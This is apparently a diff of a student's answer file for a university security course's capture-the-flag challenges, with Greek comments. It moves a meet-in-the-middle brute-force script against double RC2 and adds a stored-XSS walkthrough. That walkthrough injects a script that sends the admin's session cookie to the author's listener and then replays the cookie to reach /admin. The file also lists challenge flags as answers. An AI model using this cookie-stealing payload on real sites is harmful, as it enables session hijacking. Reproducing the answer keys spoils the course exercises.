@@ -812,82 +812,6 @@ def solve():
 if __name__ == "__main__":
     voodoo_magic = solve()
 -----------------------------------------------------------------------------------------------
-challenge: #tworc2
-solution: b48b2e90f78f26bd6a91df2931b798d3
-hint: from Crypto.Cipher import ARC2
-from pwn import *
-import binascii
-import os
-
-def solve():
-    print("[*] Connecting to server...")
-    r = remote('shell.hackintro.di.uoa.gr', 47553)
-    
-    # Διαβάζουμε μέχρι την γραμμή του flag
-    r.recvuntil(b'==================================\n')
-    encrypted_flag_hex = r.recvline().strip().decode()
-    r.recvuntil(b'==================================\n')
-    
-    encrypted_flag = binascii.unhexlify(encrypted_flag_hex)
-    print(f"[*] Encrypted flag: {encrypted_flag_hex}")
-    
-    # Στέλνουμε το δικό μας plaintext
-    plaintext = b"AAAAAAAA"
-    r.sendlineafter(b': ', plaintext)
-    
-    r.recvuntil(b'==================================\n')
-    ciphertext_hex = r.recvline().strip().decode()
-    ciphertext = binascii.unhexlify(ciphertext_hex)
-    print(f"[*] Known Plaintext: {plaintext}")
-    print(f"[*] Known Ciphertext: {ciphertext_hex}")
-    
-    r.close()
-
-    print("[*] Building encryption dictionary for key1 (this may take a minute...)")
-    enc_dict = {}
-    
-    # Δοκιμάζουμε και τα 16.7 εκατομμύρια πιθανά κλειδιά για το key1
-    for i in range(2**24):
-        k1 = i.to_bytes(3, 'big')
-        cipher1 = ARC2.new(k1.ljust(5, b'\x00'), ARC2.MODE_ECB)
-        enc = cipher1.encrypt(plaintext)
-        enc_dict[enc] = k1
-        
-        if i % 1000000 == 0 and i > 0:
-            print(f"    Progress: {i}/{2**24} keys...")
-
-    print("[*] Searching for key2...")
-    key1, key2 = None, None
-    for i in range(2**24):
-        k2 = i.to_bytes(3, 'big')
-        cipher2 = ARC2.new(k2.ljust(5, b'\x00'), ARC2.MODE_ECB)
-        dec = cipher2.decrypt(ciphertext)
-        
-        if dec in enc_dict:
-            key1 = enc_dict[dec]
-            key2 = k2
-            print(f"[+] Found keys! key1: {key1.hex()}, key2: {key2.hex()}")
-            break
-            
-        if i % 1000000 == 0 and i > 0:
-            print(f"    Progress: {i}/{2**24} keys...")
-            
-    if key1 and key2:
-        print("[*] Decrypting flag...")
-        cipher2 = ARC2.new(key2.ljust(5, b'\x00'), ARC2.MODE_ECB)
-        cipher1 = ARC2.new(key1.ljust(5, b'\x00'), ARC2.MODE_ECB)
-        
-        decrypted_flag = cipher1.decrypt(cipher2.decrypt(encrypted_flag))
-        
-        print("\n[+] FLAG:")
-        # Μπορεί να χρειαστεί να αφαιρέσουμε padding άρα εκτυπώνουμε το ωμό αποτέλεσμα
-        print(decrypted_flag.decode(errors='ignore'))
-    else:
-        print("[-] Keys not found. Something went wrong.")
-
-if __name__ == '__main__':
-    solve()
------------------------------------------------------------------------------------------------
 challenge: #Sequels are bad: Blind Edition
 solution: b0e91005e21e8328ea0fd928ba752324
 hint: Username: admin
@@ -1122,6 +1046,95 @@ def main():
 
 if __name__ == "__main__":
     main()
+-----------------------------------------------------------------------------------------------
+challenge: #Steal the Cookie!
+solution: 03851da5e28f6a4f7d637ad27fc33232
+hint: ssh dimitriskaragiannis36@shell.hackintro.di.uoa.gr >
+python3 -m http.server 9001
+ανοίγω άλλο terminal και στέλνω:
+curl -i -s -X POST http://shell.hackintro25.di.uoa.gr:38842/message \
+  --data-urlencode "message=<script>new Image().src='http://shell.hackintro.di.uoa.gr:9001/?c='+encodeURIComponent(document.cookie)</script>"
+μου δίνει: "GET /?c=session%3DeyJhZG1pbiI6MSwidXNlciI6ImFkbWluIn0.ahXXrg.BIHdUaki0G3tze-myHkv6Nr_hdk HTTP/1.1" 200 -
+οπότε session%3DeyJhZG1pbiI6MSwidXNlciI6ImFkbWluIn0.ahXXrg.BIHdUaki0G3tze-myHkv6Nr_hdk > βγάζω το %3D >
+curl -s -H "Cookie: session=eyJhZG1pbiI6MSwidXNlciI6ImFkbWluIn0.ahXXrg.BIHdUaki0G3tze-myHkv6Nr_hdk" \
+  http://shell.hackintro25.di.uoa.gr:38842/admin και μου δίνει: 
+/b>: <code>03851da5e28f6a4f7d637ad27fc33232</code></p> --> 03851da5e28f6a4f7d637ad27fc33232
+-----------------------------------------------------------------------------------------------
+challenge: #tworc2
+solution: b48b2e90f78f26bd6a91df2931b798d3
+hint: from Crypto.Cipher import ARC2
+from pwn import *
+import binascii
+import os
+
+def solve():
+    print("[*] Connecting to server...")
+    r = remote('shell.hackintro.di.uoa.gr', 47553)
+    
+    # Διαβάζουμε μέχρι την γραμμή του flag
+    r.recvuntil(b'==================================\n')
+    encrypted_flag_hex = r.recvline().strip().decode()
+    r.recvuntil(b'==================================\n')
+    
+    encrypted_flag = binascii.unhexlify(encrypted_flag_hex)
+    print(f"[*] Encrypted flag: {encrypted_flag_hex}")
+    
+    # Στέλνουμε το δικό μας plaintext
+    plaintext = b"AAAAAAAA"
+    r.sendlineafter(b': ', plaintext)
+    
+    r.recvuntil(b'==================================\n')
+    ciphertext_hex = r.recvline().strip().decode()
+    ciphertext = binascii.unhexlify(ciphertext_hex)
+    print(f"[*] Known Plaintext: {plaintext}")
+    print(f"[*] Known Ciphertext: {ciphertext_hex}")
+    
+    r.close()
+
+    print("[*] Building encryption dictionary for key1 (this may take a minute...)")
+    enc_dict = {}
+    
+    # Δοκιμάζουμε και τα 16.7 εκατομμύρια πιθανά κλειδιά για το key1
+    for i in range(2**24):
+        k1 = i.to_bytes(3, 'big')
+        cipher1 = ARC2.new(k1.ljust(5, b'\x00'), ARC2.MODE_ECB)
+        enc = cipher1.encrypt(plaintext)
+        enc_dict[enc] = k1
+        
+        if i % 1000000 == 0 and i > 0:
+            print(f"    Progress: {i}/{2**24} keys...")
+
+    print("[*] Searching for key2...")
+    key1, key2 = None, None
+    for i in range(2**24):
+        k2 = i.to_bytes(3, 'big')
+        cipher2 = ARC2.new(k2.ljust(5, b'\x00'), ARC2.MODE_ECB)
+        dec = cipher2.decrypt(ciphertext)
+        
+        if dec in enc_dict:
+            key1 = enc_dict[dec]
+            key2 = k2
+            print(f"[+] Found keys! key1: {key1.hex()}, key2: {key2.hex()}")
+            break
+            
+        if i % 1000000 == 0 and i > 0:
+            print(f"    Progress: {i}/{2**24} keys...")
+            
+    if key1 and key2:
+        print("[*] Decrypting flag...")
+        cipher2 = ARC2.new(key2.ljust(5, b'\x00'), ARC2.MODE_ECB)
+        cipher1 = ARC2.new(key1.ljust(5, b'\x00'), ARC2.MODE_ECB)
+        
+        decrypted_flag = cipher1.decrypt(cipher2.decrypt(encrypted_flag))
+        
+        print("\n[+] FLAG:")
+        # Μπορεί να χρειαστεί να αφαιρέσουμε padding άρα εκτυπώνουμε το ωμό αποτέλεσμα
+        print(decrypted_flag.decode(errors='ignore'))
+    else:
+        print("[-] Keys not found. Something went wrong.")
+
+if __name__ == '__main__':
+    solve()
 -----------------------------------------------------------------------------------------------
 challenge: #wasm 3
 solution: vm5_all_the_w4y_down
